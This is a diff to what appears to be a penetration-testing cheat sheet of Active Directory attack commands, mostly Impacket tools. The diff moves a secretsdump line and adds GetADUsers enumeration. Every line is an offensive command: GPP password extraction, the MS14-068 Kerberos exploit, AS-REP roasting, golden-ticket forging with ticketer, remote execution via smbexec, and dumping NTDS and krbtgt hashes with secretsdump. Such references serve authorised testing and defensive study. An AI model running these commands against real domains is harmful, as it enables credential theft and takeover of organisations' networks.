@@ -17,7 +17,8 @@ Get-GPPPassword -debug -no-pass "$DC_HOST"
 Get-GPPPassword "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 ms14-068.py -u "$USER"@"$DOMAIN" --rc4 "$NT_HASH" -s "$DOMAIN_SID" -d "$DC_HOST"
 getST.py -k -no-pass -spn host/"$DC_HOST" "$DOMAIN"/"$USER"
-secretsdump -ntds ntds.dit.save -system system.save LOCAL
+GetADUsers.py -all -dc-ip "$DC_IP" "$DOMAIN"/"$USER"
+GetADUsers.py -all -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD" | awk '/^----/{flag=1; next} flag' | cut -d' ' -f1 | tee user.txt
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 -dc-ip "$DC_IP" "$DOMAIN"/"$USER"
@@ -36,6 +37,7 @@ ticketer.py -nthash "$NT_HASH" -spn HOST/"$TARGET" -domain-sid "$DOMAIN_SID" -do
 smbclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 smbexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 smbexec.py -share 'ADMIN$' -k "$TARGET"
+secretsdump -ntds ntds.dit.save -system system.save LOCAL
 secretsdump -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
 secretsdump -just-dc-user krbtgt -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
 secretsdump -k "$TARGET"
